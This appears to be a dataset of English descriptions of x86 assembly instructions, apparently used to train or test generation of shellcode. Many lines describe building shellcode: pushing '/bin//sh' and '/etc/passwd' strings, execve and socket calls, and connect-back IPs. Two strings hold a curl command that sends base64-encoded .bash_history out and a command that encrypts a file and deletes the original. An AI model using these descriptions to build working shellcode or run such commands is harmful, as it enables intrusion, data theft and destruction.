+move 0x243525f0 into esi
+move 0x34399797 into esi
+move 0x353ffc3b into esi
+move 0x563a1f3e into esi
+move 0x65636170 into esi
+move 0x68732f2f into esi
+move 0x72702f2f into esi
+move 0x735f6176 into esi
+move 0x91969dd0 into esi
+move 0xd2c45e5e into esi
+move 10 into esi
+move 9 into esi
+place address buff into esi
+move pointer in eax into esi
+move eax into esi
+move ecx into esi
+move remainder into esi
+move esp into esi
+move v to esi
+move v_src to esi
+copy the address of var into esi
+move the contents of the ebp register ino the esp register
+move the contents of the ebp register into the esp register
+move the contents of the esi register into the long starting at the address [esi+18]
+move the contents of the ebx register into the long starting at the address [esi+22]
+move the contents of the esi register into the long starting at the address [esi+22]
+move the contents of the eax register into the long starting at the address [esi+26]
+move the contents of the ebx register into the long starting at the address [esi+26]
+move the contents of the eax register into the long starting at the address [esi+30]
+move eax into sock_reg
+transfer the value 48 in the memory variable total
+move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx
+move 0x776f into the word in [esp+0x1]
+move eax to x variable
+backup edx into ecx
+define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'
+declare msg string containing 'hello world!'
+define msg variable and initialize with 'i love you!'
+define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'
+define msg as the byte string 'we found the egg!'
+define msg_len equal to the length of msg
+declare message string msg1 containing 'hello brave new world!'
+define msg2 as the byte string 'passwd'
+declare message string msg2 containing 'this is how we recycle in nasm'
+declare msglength to have the constant value 12
+multiply the contents of eax by the 32-bit contents of the memory location tmp
+multiply the contents of eax by the 32-bit contents of the memory location value
+multiply the contents of eax by the 32-bit contents of the memory location var
+multiply eax by 0x10 and stores the result in edx:eax
+multiply the contents of eax by 25
+multiply the contents of eax by 3
+multiply the contents of eax by ebx
+multiply the contents of the eax register by the contents of the ebx register
+multiply eax by ebx
+multiply eax by the contents of the ebx register
+mul eax by ebx
+mul eax by ecx
+multiply eax by the contents of the ecx register
+mutliply eax by ecx
+multiply eax by the contents of the edx register
+mul eax by edx
+multiply eax by edx
+allocate 10 words each initialized to 0
+allocate my_table vector of 10 words each initialized to 0
+define my_var word variable and initialize it to 0abcdh
+define myList array of word and initialize it to 1, 2, 3, 4, and 5
+define name as the byte string '/bin/sh'
+allocate memory for 30 bytes uninitialized name variable
+negate eax
+negate the contents of eax
+replaces the contents of the eax register with its two's complement
+replaces the contents of the ebx register with its two's complement
+replaces the contents of the ecx register with its two's complement
+negate edi
+replaces the contents of the edi register with its two's complement
+replaces the contents of the edx register with its two's complement
+negate the contents of var
+define the variable neg_number of words and initialize it to -12345
+define negative label
+declare next_addr function
+declare the next_addr label
+declare the next_cycle label
+declare next_page function
+declare the next label
+do no operation
+no operation
+negate all the bits of ax register
+negate all the bits of the ax register
+negate all bits in the byte at the memory location tmp
+negate all bits in the byte at the memory location var
+negate all bits in the byte at the memory location var2
+negate all the bits of dl register
+negate all the bits of the eax register
+negate all the bits of ecx register
+negate all the bits of the ecx register
+negate all the bits of the edi register
+perform a bit-wise inversion of edx
+negate all the bits of the esi register
+define number variable of a word and initialize to 12345
+reserve 1 byte for number variable
+declare an array of six words each initialized with the numbers 34 45 56 67 75 89
+declare the one label
+declare one label
+perform or operation between al and bl registers
+perform or operation between the al register and syscall_execve
+perform logical or between the cx register and 0xfff
+perform or operation between dx and 0xfff and save the result into dx
+perform the or operation between the eax register and 0xffffffff
+declare the output label
+define path as the byte string '//bin/sh'
+define the byte string path and initialize it to '//bin/sh'
+declare the path label
+pop the top element of the stack into memory at the four bytes starting at location eax
+pop the top element of the stack into memory at the four bytes starting at location ebx
+pop the last element pushed onto the stack into ax
+pop the last element pushed onto the stack into bx
+pop the value on the stack back into cx
+restore the top of the stack into the cx register
+pop the value on the stack back into dx
+restore the top of the stack into the dx register
+pop the value on the stack back into eax
+put syscall value into eax
+restore eax from the value we pushed onto the stack at the start
+restore the original value of eax
+restore the top of the stack into eax register
+restore the top of the stack into the eax register
+pop the top of the stack into the eax register
+remove last character from the stack into edx
+pop the next argument off the stack into eax
+remove last character from the stack into eax
+restore ebp register
+restore the top of the stack into the ebp register
+restore ebx from the value we pushed onto the stack at the start
+restore the original value of ebx
+restore the top of the stack into ebx register
+restore the top of the stack into the ebx register
+remove last character from the stack into ebx
+pop the value on the stack back into ebx
+remove last character from the stack into ecx
+restore ecx from the value we pushed onto the stack at the start
+restore ecx register
+pop the value on the stack back into ecx
+restore the top of the stack into the ecx register
+restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit
+restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit
+restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit
+pop the top element of the stack into edi
+restore the top of the stack into the edi register
+restore edx from the value we pushed onto the stack at the start
+restore the top of the stack into edx register
+restore the top of the stack into the edx register
+pop the top of the stack into the edx register
+restore esi from the value we pushed onto the stack at the start
+store the shellcode pointer to esi
+save the shellcode in the esi register
+load the shellcode in esi
+encoded shellcode in esi
+save the address of the shellcode in esi
+pop the address of the shellcode in the esi register
+store the pointer to the shellcode into esi
+pop the shellcode in esi and save it into dx
+restore the top of the stack into the esp register
+restore the top of the stack into the si register
+move doublewords from the stack into the 32 bit registers
+move doublewords from the stack into the general purpose registers
+pop doublewords from the stack into the general purpose registers
+define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
+define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
+declare the prepare label
+declare the priv_setgid label
+declare the priv_setuid label
+declare the process_shellcode label
+push _ip onto the stack
+push '//pa' onto the stack
+push '//sh' onto the stack
+push '/bin' onto the stack
+push '/etc' onto the stack
+push 'sswd' onto the stack
+push the 4 bytes at address tmp onto stack
+push the 4 bytes at address var onto the stack
+push the 4 bytes at address var2 onto the stack
+push 0bh onto the stack
+push the value 0x0 to the stack
+push 0x0 onto the stack
+push 0x04020a0a onto the stack
+push 0x0a206873 onto the stack
+push 0x0a3a7964 onto the stack
+push the value 0x0a4c4c41 onto the stack
+push 0x0a4c4c41 onto the stack
+push the value 0x1 onto the stack
+push 0x1 to the stack
+push 0x1 onto the stack
+push 0x10 onto the stack
+push 0x10 to the stack
+push the 0x10 onto the stack
+push the value 0x10 onto the stack
+push the value 0x16 onto the stack
+push the value 0x1a onto the stack
+push the value 0x1a to the stack
+push the value 0x1c onto the stack
+push the value 0x1c to the stack
+push 0x2 onto the stack
+push 0x2 to the stack
+push the 0x2 onto the stack
+push the 0x203a4457 onto the stack
+push 0x203a4457 onto the stack
+push 0x204c4c41 onto the stack
+push the 0x204c4c41 onto the stack
+push 0x2431243a onto the stack
+push the value 0x29 to the stack
+push 0x29 onto the stack
+push 0x2e312e31 onto the stack
+push the value 0x2e312e31 to the stack
+push the value 0x2e323931 onto the stack
+push 0x2e323931 to the stack
+push 0x2e373231 to the stack
+push 0x2e373231 onto the stack
+push the value 0x2e383631 onto the stack
+push 0x2e383631 to the stack
+push 0x2f2f2f2f onto the stack
+push 0x2f2f2f2f to the stack
+push the 0x2f2f2f2f onto the stack
+push the value 0x2f2f2f2f onto the stack and point eax to the stack register
+push the value 0x2f2f2f2f onto the stack and point ebx to the stack register
+push the value 0x2f2f2f2f onto the stack and point ecx to the stack register
+push the value 0x2f2f2f2f onto the stack and point edi to the stack register
+push the value 0x2f2f2f2f onto the stack and point edx to the stack register
+push the value 0x2f2f2f2f onto the stack and point esi to the stack register
+push the 0x2f2f2f6e onto the stack
+push 0x2f3a706d onto the stack
+push 0x2f3a746f onto the stack
+push 0x2f656c2d onto the stack
+push the 0x2f656c2d onto the stack
+push 0x2f6e6962 to the stack
+push 0x2f6e6962 onto the stack
+push the value 0x30 onto the stack
+push 0x30313a31 to the stack
+push 0x30313a31 onto the stack
+push 0x30317974 onto the stack
+push the 0x30317974 onto the stack
+push 0x31313131 onto the stack
+push 0x3131313a onto the stack
+push 0x31373737 onto the stack
+push the 0x31373737 onto the stack
+push 0x3170762d onto the stack
+push the value 0x3170762d to the stack
+push the 0x3170762d onto the stack
+push 0x32322e32 onto the stack
+push 0x32322e32 to the stack
+push 0x3458652e onto the stack
+push 0x37373333 to the stack
+push the 0x37373333 onto the stack
+push 0x37373333 onto the stack
+push 0x3a303a3a onto the stack
+push 0x3a30754a onto the stack
+push the value 0x3d4c4c41 onto the stack
+push 0x3d4c4c41 onto the stack
+push 0x3e0a7964 onto the stack
+push 0x4 onto the stack
+push the value 0x4 onto the stack
+push 0x45683933 onto the stack
+push 0x46 onto the stack
+push 0x4c4c4128 onto the stack
+push the value 0x4c4c4128 onto the stack
+push 0x4c5a304b onto the stack
+push the value 0x4f4e2029 onto the stack
+push 0x4f4e2029 onto the stack
+push 0x5 onto the stack
+push the 0x5 onto the stack
+push 0x50446862 onto the stack
+push the 0x53534150 onto the stack
+push 0x53534150 onto the stack
+push 0x6 onto the stack
+push the 0x6 value onto the stack
+push 0x61622f2f onto the stack
+push 0x61622f6e onto the stack
+push 0x61655220 onto the stack
+push 0x6168732f onto the stack
+push 0x6168732f to the stack
+push the value 0x6168732f onto the stack
+push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
+push 0x61702f2f onto the stack
+push the value 0x61702f2f and the value 0x6374652f onto the stack and point the eax register to the stack register
+push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register
+push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ecx register to the stack register
+push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register
+push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register
+push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register
+push the 0x61702f63 onto the stack
+push 0x61702f63 onto the stack
+push 0x622f7273 onto the stack
+push 0x622f7273 to the stack
+push 0x636e2f2f onto the stack
+push 0x636e2f2f to the stack
+push the 0x636e2f2f onto the stack
+push 0x6374652f onto the stack
+push 0x6374652f to the stack
+push the 0x6374652f onto the stack
+push the value 0x6374652f onto the stack and point eax to the stack register
+push the value 0x6374652f onto the stack and point ebp to the stack register
+push the value 0x6374652f onto the stack and point ebx to the stack register
+push the value 0x6374652f onto the stack and point ecx to the stack register
+push the value 0x6374652f onto the stack and point edi to the stack register
+push the value 0x6374652f onto the stack and point edx to the stack register
+push the value 0x6374652f onto the stack and point esi to the stack register
+push 0x64687373 onto the stack
+push the value 0x64687373 onto the stack and point the eax register to the stack register
+push the value 0x64687373 onto the stack and point the ebp register to the stack register
+push the value 0x64687373 onto the stack and point the ebx register to the stack register
+push the value 0x64687373 onto the stack and point the ecx register to the stack register
+push the value 0x64687373 onto the stack and point the edi register to the stack register
+push the value 0x64687373 onto the stack and point the edx register to the stack register
+push the value 0x64687373 onto the stack and point the esi register to the stack register
+push 0x6475732f onto the stack
+push 0x6475732f to the stack
+push the 0x6475732f onto the stack
+push the value 0x6475732f and the value 0x6374652f onto the stack and point the eax register to the stack register
+push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
+push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
+push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register
+push the value 0x6475732f and the value 0x6374652f onto the stack and point the edx register to the stack register
+push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register
+push the 0x64777373 onto the stack
+push 0x64777373 onto the stack
+push 0x6567772f onto the stack
+push 0x6567772f to the stack
+push 0x656c6966 onto the stack
+push the 0x656c6966 onto the stack
+push 0x65726f43 onto the stack
+push 0x65782e2f onto the stack
+push 0x65782e2f to the stack
+push 0x66 onto the stack
+push 0x66 to the stack
+push the 0x66 onto the stack
+push 0x67513231 onto the stack
+push 0x6769666e onto the stack
+push 0x682f2f2f onto the stack
+push the 0x682f2f2f value onto the stack
+push //sh to the stack
+push ascii sh// onto stack
+push hs//
+push the 0x68732f2f value onto the stack
+push the value 0x68732f2f onto the stack
+push 0x68732f2f to the stack
+push 0x68732f2f onto the stack
+push /bin/sh onto the stack and point the eax register to the stack register
+move /bin/sh into eax
+put ASCII /bin/sh into eax
+move /bin/sh into the eax register
+push ASCII /bin/sh onto the stack and point the ebx register to the stack register
+put /bin/sh into ebx
+move ASCII /bin/sh into ebx
+move /bin/sh into the ebx register
+move ASCII /bin/sh into ecx
+move /bin/sh into the ecx register
+push /bin/sh onto the stack and point the ecx register to the stack register
+put /bin/sh into ecx
+push ASCII /bin/sh onto the stack and point the edx register to the stack register
+put /bin/sh into edx
+move ASCII /bin/sh into edx
+move /bin/sh into the edx register
+push the 0x68732f6e onto the stack
+push 0x68732f6e to the stack
+push 0x68732f6e onto the stack
+push the value 0x68735858 onto the stack
+push 0x68736162 to the stack
+push 0x68736162 onto the stack
+push 0x68736164 to the stack
+push 0x68736164 onto the stack
+push the value 0x6873732f onto the stack
+push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register
+push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
+push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
+push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register
+push the value 0x6873732f and the value 0x6374652f onto the stack and point the edx register to the stack register
+push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register
+push 0x68737a2f onto the stack
+push the 0x69616863 onto the stack
+push the 0x69622f2f onto the stack
+push 0x69622f2f to the stack
+push 0x69622f2f onto the stack
+push the value 0x69622f2f onto the stack and point the eax register to the stack register
+push the value 0x69622f2f onto the stack and point the ebx register to the stack register
+push the value 0x69622f2f onto the stack and point the ecx register to the stack register
+push the value 0x69622f2f onto the stack and point the edx register to the stack register
+push 0x69622f3a onto the stack
+push 0x69622f65 onto the stack
+push 0x69622f65 to the stack
+push the 0x69622f65 onto the stack
+push 0x6962732f onto the stack
+push the 0x6962732f onto the stack
+push 0x6c626174 onto the stack
+push the 0x6d722f2f onto the stack
+push 0x6d726574 onto the stack
+push 0x6d726574 to the stack
+push the 0x6e onto the stack
+push /bin to the stack
+push 0x6e69622f onto the stack
+push ascii nib/ onto stack
+push nib/
+push the 0x6e69622f onto the stack
+push the value 0x6e69622f onto the stack
+push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register
+push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register
+push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ecx register to the stack register
+push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register
+push the 0x6e776f64 onto the stack
+push 0x6e7a762d onto the stack
+push the value 0x6e7a762d onto the stack and point the ebp register to the stack register
+push the value 0x6e7a762d onto the stack and point the ebx register to the stack register
+push the value 0x6e7a762d onto the stack and point the edi register to the stack register
+push the value 0x6e7a762d onto the stack and point the esi register to the stack register
+push 0x6f635f64 onto the stack
+push 0x6f723a30 onto the stack
+push the value 0x7 onto the stack and point edx to the stack register
+push 0x70692f6e onto the stack
+push the 0x70692f6e onto the stack
+push 0x706d742f onto the stack
+push 0x706d742f to the stack
+push the 0x706d742f onto the stack
+push 0x7268732f onto the stack
+push 0x72706475 onto the stack
+push 0x7273752f onto the stack
+push 0x7273752f to the stack
+push 0x7361702f to the stack
+push 0x7361702f onto the stack
+push 0x73644d24 onto the stack
+push 0x7369642d to the stack
+push 0x7369642d onto the stack
+push the 0x7372656f onto the stack
+push 0x7372656f to the stack
+push 0x7372656f onto the stack
+push 0x7374736f onto the stack
+push the 0x7374736f onto the stack
+push 0x74 onto the stack
+push 0x74 to the stack
+push 0x742f2f2f onto the stack
+push the 0x742f2f2f onto the stack
+push 0x742f3a31 onto the stack
+push 0x74303072 onto the stack
+push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register
+push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register
+push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ecx register to the stack register
+push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register
+push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register
+push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register
+push the 0x74652f2f onto the stack
+push 0x74652f2f onto the stack
+push 0x746f6f72 onto the stack
+push the 0x74756873 onto the stack
+push 0x74756f2f onto the stack
+push the 0x74756f2f onto the stack
+push 0x752f2f2f onto the stack
+push 0x752f2f2f to the stack
+push 0x7665642f onto the stack
+push the 0x7665642f onto the stack
+push 0x76766c2d onto the stack
+push 0x76766c2d to the stack
+push the 0x76766c2d onto the stack
+push 0x78 onto the stack
+push 0x78 to the stack
+push the 0x78 onto the stack
+push 0x782f2f32 onto the stack
+push 0x782f2f32 to the stack
+push 0x782f6e69 onto the stack
+push 0x782f6e69 to the stack
+push 0x78534a52 onto the stack
+push 0x79616c70 to the stack
+push 0x79616c70 onto the stack
+push 0x8 onto the stack
+push 0x81e3a8c0 onto the stack
+push 0x8501a8c0 onto the stack
+push 0xa onto the stack
+push 0xa to the stack
+push the 0xa01a8c0 onto the stack
+push 0xb to the stack
+push 0xb onto the stack
+push 0xdebf value to the stack
+push 0xefffff7f onto the stack
+push 0xf onto the stack
+push 1 to the stack
+push 1 onto the stack
+push 10 onto the stack
+push the value 10 onto the stack and point eax to the stack register
+push 102 onto the stack
+push the value 12 onto the stack and point ebx to the stack register
+push the value 15 onto the stack and point ecx to the stack register
+push 16 onto the stack
+push 2 onto the stack
+push 20 onto the stack
+push the 20 onto the stack
+push 216 value to the stack
+push 6 onto the stack
+push ax onto the stack
+push ax to the stack
+push the ax onto the stack
+push bx onto the stack
+push bx to the stack
+push the contents of the bx register onto the stack
+push the byte -1 onto the stack
+push the byte +0x1 onto the stack
+push the byte +0x10 onto the stack
+push the byte +0x2 onto the stack
+push the byte +0x3 onto the stack
+push the byte +0x46 onto the stack
+push the byte +0x6 onto the stack
+push the byte +0x66 onto the stack
+push the byte +0x7f onto the stack
+push the byte +0x8 onto the stack
+push the byte +0xb onto the stack
+push byte 0 onto stack
+push the byte 0x0 onto the stack
+push the byte 0x01 onto the stack
+push the byte 0x01 to the stack
+put the syscall 0x01 into the eax register
+push the byte 0x02 onto the stack
+push the byte 0x02 to the stack
+put the syscall 0x02 into the eax register
+push the byte 0x04 onto the stack
+put the syscall 0x04 into the eax register
+push the byte 0x05 onto the stack
+put the syscall 0x05 into the eax register
+push the byte 0x06 onto the stack
+put the syscall 0x06 into the eax register
+push the byte 0x0b onto the stack
+put the syscall 0x0b into the eax register
+push the byte 0x1 to the stack
+push the byte 0x1 onto the stack
+push the byte 0x1 onto the stack and point ecx to the stack register
+push the byte 0x10 onto the stack
+put the syscall 0x10 into the eax register
+push the byte 0x11 onto the stack and point ebx to the stack register
+push the byte 0x17 onto the stack
+put the syscall 0x17 into the eax register
+push the byte 0x1c onto the stack
+put the syscall 0x1c into the eax register
+push the byte 0x1f onto the stack
+put the syscall 0x1f into the eax register
+push the byte 0x2 onto the stack
+push the byte 0x2 to the stack
+push the byte 0x2 onto the stack and point ecx to the stack register
+put the syscall 0x2 into the eax register
+push the byte 0x2e onto the stack
+put the syscall 0x2e into the eax register
+push the byte 0x2f onto the stack
+put the syscall 0x2f into the eax register
+push the byte 0x3 onto the stack
+put the syscall 0x3 into the eax register
+push the byte 0x30 onto the stack
+put the syscall 0x30 into the eax register
+push the byte 0x3f onto the stack
+put the syscall 0x3f into the eax register
+push the byte 0x4 onto the stack
+put the syscall 0x4 into the eax register
+make the system call sigaction
+sigaction
+syscall for sigaction
+system call sigaction
+put syscall sigaction into the eax register
+put the syscall 0x43 into the eax register
+push the byte 0x5 onto the stack and point ebx to the stack register
+push the byte 0x5 onto the stack and point edx to the stack register
+push the byte 0x64 to the stack
+push the byte 0x64 onto the stack
+put the syscall 0x64 into the eax register
+push the byte 0x66 onto the stack
+put the syscall 0x66 into the eax register
+push the byte 0x7 onto the stack and point edx to the stack register
+push the byte 0x77 to the stack
+push the byte 0x77 onto the stack
+put the syscall 0x77 into the eax register
+push the byte 0x8 onto the stack and point edx to the stack register
+push the byte 0xb onto the stack
+put the syscall 0xb into the eax register
+push the byte 0xc onto the stack
+put the syscall 0xc into the eax register
+move byte 1 onto stack
+push byte 1 onto the stack
+push the byte 1 to the stack
+push the byte 1 onto the stack
+push the byte 1 onto the stack and point eax to the stack register
+put the syscall 1 into the eax register
+push the byte 10 onto the stack
+push the byte 10 to the stack
+put the syscall 10 into the eax register
+push the byte 11 onto the stack
+push the byte 11 to the stack
+put the syscall 11 into the eax register
+push the byte 15 onto the stack
+push the byte 15 to the stack
+put the syscall 15 into the eax register
+push byte 16 onto stack
+push the byte 16 onto the stack
+put the syscall 16 into the eax register
+push the byte 17h onto the stack
+put the syscall 17h into the eax register
+push byte 2 onto the stack
+push the byte 2 onto the stack
+put the syscall 2 into the eax register
+push the byte 25 onto the stack
+put the syscall 25 into the eax register
+push the byte 28 to the stack
+put the syscall 28 into the eax register
+push the byte 3 onto the stack and point ebx to the stack register
+push the byte 37 onto the stack
+put the syscall 37 into the eax register
+push the byte 3h onto the stack
+put the syscall 3h into the eax register
+push the byte 4 onto the stack
+put the syscall 4 into the eax register
+push the byte 49 onto the stack
+put the syscall 49 into the eax register
+push the byte 5 onto the stack
+put the syscall 5 into the eax register
+push the byte 54 onto the stack
+put the syscall 54 into the eax register
+push byte 6 onto the stack
+push the byte 6 onto the stack
+push the byte 6 to the stack
+put the syscall 6 into the eax register
+push the byte 67 onto the stack
+put the syscall 67 into the eax register
+push the byte 70 onto the stack
+put the syscall 70 into the eax register
+push the byte 8 onto the stack
+put the syscall 8 into the eax register
+push the byte 9 onto the stack
+put the syscall 9 into the eax register
+push the byte chmod_call onto the stack
+put the byte my_label into the eax register
+put the byte CHMOD_CALL into the eax register
+put the byte L1 into the eax register
+put the byte my_value into the eax register
+put the byte VALUE into the eax register
+push the contents of the cx register onto the stack
+push the dword [ebp+16] onto the stack
+push the doubleword [edx+2] to the stack
+push the dword [edx+2] onto the stack
+push the doubleword 0x00000000 onto the stack
+push the dword 0x0101017f onto the stack
+push the dword 0x017aa8c0 onto the stack
+push the dword 0x0501a8c0 onto the stack
+push the double word 0x0a206873 onto the stack
+push the dword 0x10 onto the stack
+push the double word 2 onto the stack
+push the dword 0x214c4f4c onto the stack
+push the double word 0x2335738c onto the stack
+push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register
+push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ebx register to the stack register
+push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ecx register to the stack register
+push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register
+push the dword 0x2f2f6e69 onto the stack
+push the doubleword 0x2f2f6e69 to the stack
+push the double word 0x2f3a2f3a onto the stack
+push the dword 0x2f3a3a30 onto the stack
+push the double word 0x2f6e6962 onto the stack
+push the double word 0x303a3a31 onto the stack
+push the double word 0x313a303a onto the stack
+push double word 0x39396e2d onto the stack and point the ebp register to the stack register
+push double word 0x39396e2d onto the stack and point the ebx register to the stack register
+push double word 0x39396e2d onto the stack and point the edi register to the stack register
+push double word 0x39396e2d onto the stack and point the esi register to the stack register
+push the dword 0x3a303a3a onto the stack
+push the doubleword 0x4227a28b onto the stack
+push the dword 0x45525649 onto the stack
+push the dword 0x58494741 onto the stack
+push the dword 0x5f657a69 onto the stack
+push the dword 0x6164732f onto the stack
+push the dword 0x61702f2f onto the stack
+push the dword 0x61702f63 onto the stack
+push the dword 0x61722f6c onto the stack
+push the doubleword 0x61747069 to the stack
+push the dword 0x61747069 onto the stack
+push the dword 0x62732f2f onto the stack
+push the doubleword 0x62732f2f to the stack
+push the doubleword 0x62732f2f onto the stack and point the ebx register to the stack register
+push the dword 0x6374652f onto the stack
+push the dword 0x64616568 onto the stack
+push the dword 0x64777373 onto the stack
+push the dword 0x656e7265 onto the stack
+push the dword 0x68732f2f onto the stack
+push the dword 0x68732f63 onto the stack
+push the dword 0x68732f6e onto the stack
+push the dword 0x69622f2f onto the stack
+push the dword 0x69622f3a onto the stack
+push the dword 0x6962732f onto the stack
+push the dword 0x6b2f7379 onto the stack
+push the dword 0x6b6e756a onto the stack
+push the dword 0x6d6f646e onto the stack
+push the dword 0x6e69622f onto the stack
+push the dword 0x6e69922f onto the stack
+push the dword 0x6f702f6e onto the stack
+push the dword 0x6f726577 onto the stack
+push the dword 0x7264632f onto the stack
+push the dword 0x72657355 onto the stack
+push the dword 0x732f636f onto the stack
+push the doubleword 0x73656c62 to the stack
+push the dword 0x73656c62 onto the stack
+push the dword 0x7461632f onto the stack
+push the dword 0x74652f2f onto the stack
+push double word 0x74652f2f onto the stack and point the eax register to the stack register
+push double word 0x74652f2f onto the stack and point the ebp register to the stack register
+push double word 0x74652f2f onto the stack and point the ebx register to the stack register
+push double word 0x74652f2f onto the stack and point the ecx register to the stack register
+push double word 0x74652f2f onto the stack and point the edx register to the stack register
+push double word 0x74652f2f onto the stack and point the esi register to the stack register
+push the dword 0x7665642f onto the stack
+push the dword 0x776f6461 onto the stack
+push the doubleword 0x8140a8c0 to the stack
+push the doubleword eax to the stack
+push the dword eax onto the stack
+push the doubleword ebx to the stack
+push dx onto the stack
+preserve eax on the stack
+push eax onto the stack
+push eax to the stack
+push eax value to the stack
+push the contents of eax onto the stack
+push the contents of eax register onto the stack
+push the contents of the eax register onto the stack
+push eax onto stack
+push eax on the stack
+push the value of register eax onto the stack
+push the contents of the eax register onto the stack and point ebx to the stack register
+push the contents of the eax register onto the stack and point ecx to the stack register
+push the contents of the eax register onto the stack and point edx to the stack register
+save old base pointer
+save the old base pointer value
+push the contents of the ebp register onto the stack
+push the ebp onto the stack
+push ebp onto the stack
+preserve ebx on the stack
+push the contents of ebx register onto the stack
+push the contents of the ebx register onto the stack
+push the ebx value to the stack
+push ebx onto the stack
+push the contents of ebx onto the stack
+push ebx on the stack
+push ebx to the stack
+push the contents of the ebx register onto the stack and point eax to the stack register
+push the contents of the ebx register onto the stack and point ecx to the stack register
+push the contents of the ebx register onto the stack and point edx to the stack register
+preserve ecx on the stack
+push the contents of the ecx register onto the stack
+push the value of register ecx onto the stack
+push ecx onto the stack
+push the contents of ecx register onto the stack
+push the ecx onto the stack
+push ecx on the stack
+push ecx to the stack
+push the contents of the ecx register onto the stack.
+push the edi onto the stack
+push edi to the stack
+push the contents of the edi register onto the stack
+push edi onto the stack
+push the contents of edi register onto the stack
+push the contents of the edi register onto the stack and point eax to the stack register
+push the contents of the edi register onto the stack and point ebx to the stack register
+push the contents of the edi register onto the stack and point ecx to the stack register
+push the contents of the edi register onto the stack and point edx to the stack register
+preserve edx on the stack
+push edx to the stack
+push the contents of edx register onto the stack
+push the contents of the edx register onto the stack
+push the value of register edx onto the stack
+push edx onto the stack
+push edx on the stack
+push the contents of the edx register onto the stack and point eax to the stack register
+push the contents of the edx register onto the stack and point ebx to the stack register
+push the contents of the edx register onto the stack and point ecx to the stack register
+preserve esi on the stack
+push the contents of the esi register onto the stack
+push the contents of the esi register onto the stack.
+push the esi onto the stack
+push esi onto the stack
+push the contents of esi register onto the stack
+push esi on the stack
+push the contents of the esi register onto the stack and point eax to the stack register
+push the contents of the esi register onto the stack and point ebx to the stack register
+push the contents of the esi register onto the stack and point edx to the stack register
+push the contents of esp register onto the stack
+push the contents of the esp register onto the stack
+push the esp onto the stack
+push esp to the stack
+push esp onto the stack
+push len onto the stack
+move /bin/sh into the eax register
+move /bin/sh into the ebx register
+put /bin/sh into the ecx register
+put /bin/sh into the edx register
+push name onto the stack
+push address of string print_msg
+push the contents in ogin onto the stack
+push sock_reg onto the stack
+push the sock_reg onto the stack
+push sys_execve onto the stack
+push the word [edx] onto the stack
+push the word [edx] to the stack
+push the word 0544o onto the stack
+push the word 0644o onto the stack
+push the word 0666q onto the stack
+push the word 0x02 onto the stack
+push the word 0x0a onto the stack
+push the word 0x0a to the stack
+push the word 0x0f27 onto the stack
+push the word 0x1b6 to the stack
+push the word 0x1b6 onto the stack
+push the word 0x1ff onto the stack
+push the word 0x2 onto the stack
+push the word 0x2 to the stack
+push 0x2923 onto stack port
+push the word 0x2e2e onto the stack
+push the word 0x3436 onto the stack
+push the word 0x3582 onto the stack
+push the word 0x3636 onto the stack
+push the word 0x3905 to the stack
+push the word 0x3905 onto the stack
+push the word 0x3930 onto the stack
+push the word 0x401f onto the stack
+push the word 0x4255 onto the stack
+push the word 0x462d to the stack
+push the word 0x462d onto the stack
+push 0x5000 onto stack port
+push the word 0x5445 onto the stack
+push the word 0x5974 onto the stack
+push the word 0x5c11 onto the stack
+push the word 0x5c11 to the stack
+push the word 0x632d onto the stack
+push the word 0x632d to the stack
+push the word 0x632d onto the stack and point the eax register to the stack register
+push the word 0x632d onto the stack and point the ebx register to the stack register
+push the word 0x632d onto the stack and point the ecx register to the stack register
+push the word 0x632d onto the stack and point the edi register to the stack register
+push the word 0x632d onto the stack and point the edx register to the stack register
+push the word 0x632d onto the stack and point the esi register to the stack register
+push the word 0x6465 onto the stack
+push the word 0x662d onto the stack
+push the word 0x662d onto the stack and point the eax register to the stack register
+push the word 0x662d onto the stack and point the ebx register to the stack register
+push the word 0x662d onto the stack and point the ecx register to the stack register
+push the word 0x662d onto the stack and point the edi register to the stack register
+push the word 0x662d onto the stack and point the edx register to the stack register
+push the word 0x662d onto the stack and point the esi register to the stack register
+push the word 0x6666 onto the stack
+push the word 0x6873 onto the stack
